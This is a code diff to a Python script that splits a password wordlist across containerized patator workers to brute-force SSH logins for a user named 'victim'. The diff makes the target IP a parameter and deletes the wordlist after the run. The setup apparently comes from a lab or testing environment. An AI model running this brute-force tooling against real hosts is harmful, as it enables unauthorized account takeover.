@@ -7,10 +7,10 @@ import os
 import requests
 import time
 
-def start_fuzzing(dict_path, divide_number):
+def start_fuzzing(dict_path, divide_number, target_ip):
     fuzzer_container = "registry:443/patator:latest"
     fuzzer_start = "python2 -W ignore patator.py"
-    fuzzer_options = "ssh_login host=10.1.38.15 user=victim password=FILE0 0=passwords.txt -x ignore:mesg='Authentication failed.'"
+    fuzzer_options = "ssh_login host="+target_ip+" user=victim password=FILE0 0=passwords.txt -x ignore:mesg='Authentication failed.'"
     
     upload_dict_url = "http://backend:5000/uploader"
     remove_dict_url = "http://backend:5000/remover"
@@ -59,5 +59,5 @@ def start_fuzzing(dict_path, divide_number):
     for result_id in result_id_list:
         ares = AsyncResult(result_id,app=fuzzer)
         output = output+ares.get()
-
+    os.remove(dict_path)
     return output
